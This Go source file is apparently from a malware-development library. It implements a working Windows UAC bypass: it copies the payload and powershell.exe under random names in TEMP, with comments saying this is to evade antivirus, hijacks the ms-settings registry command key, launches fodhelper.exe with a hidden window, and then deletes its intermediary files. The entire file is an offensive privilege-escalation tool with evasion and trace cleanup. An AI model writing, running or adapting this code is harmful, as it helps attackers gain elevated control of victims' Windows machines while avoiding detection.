package core

import (
  "os"
  "fmt"
  "time"
  "strings"
  "os/exec"
  "syscall"
  "io/ioutil"
  "path/filepath"

  "golang.org/x/sys/windows/registry"

  mfiles "github.com/D3Ext/maldev/files"
)

func ExecUac(path string) (error) {
  // Example format --> C:\Users\User-1\AppData\Local\Temp\<rand-string>.<file-extension>
  // Helps with UAC bypass as the path is random so it can't (almost) be flagged by AV
  temp_path := os.Getenv("TEMP") + "\\" + RandomString(8) + "." + strings.Split(path, ".")[len(strings.Split(path, "."))-1]

  // Copy path
  err := mfiles.Copy(path, temp_path)
  if err != nil {
    return err
  }

  // Create registry
	k, _, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close() // Close key
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command") // Remove key

  // Define random name
  cmdDir := filepath.Join(os.Getenv("SYSTEMROOT"), "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
  temp_cmd_path := os.Getenv("TEMP") + "\\" + RandomString(9) + "." + strings.Split(cmdDir, ".")[len(strings.Split(cmdDir, "."))-1]
  err = mfiles.Copy(cmdDir, temp_cmd_path)
  if err != nil {
    return err
  }
  //defer os.Remove(temp_cmd_path) returns an "Access denied" error as the .exe is running

  value := fmt.Sprintf("%s Start-Process %s", temp_cmd_path, temp_path)
  
  err = k.SetStringValue("", value)
  if err != nil { // Set value
    return err
  }
  
  err = k.SetStringValue("DelegateExecute", "")
  if err != nil {
    return err
  }

  time.Sleep(time.Second)
  cmd := exec.Command("cmd.exe", "/C", "fodhelper.exe") // Run fodhelper
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
  err = cmd.Run()
  time.Sleep(500 * time.Millisecond)

  return err
}

func RemoveUacFiles() (error) { // Remove intermediary files used by fodhelper technique
  files, err := ioutil.ReadDir(os.Getenv("TEMP"))
  if err != nil {
    return err
  }

  for _, f := range files {
    if !f.IsDir() {
      filename_len := len(strings.Join(strings.Split(f.Name(), ".exe"), ""))
      if filename_len == 8 || filename_len == 9 {
        err = os.Remove(os.Getenv("TEMP") + "\\" + f.Name())
        if err != nil {
          return err
        }
      }
    }
  }

  return nil
}



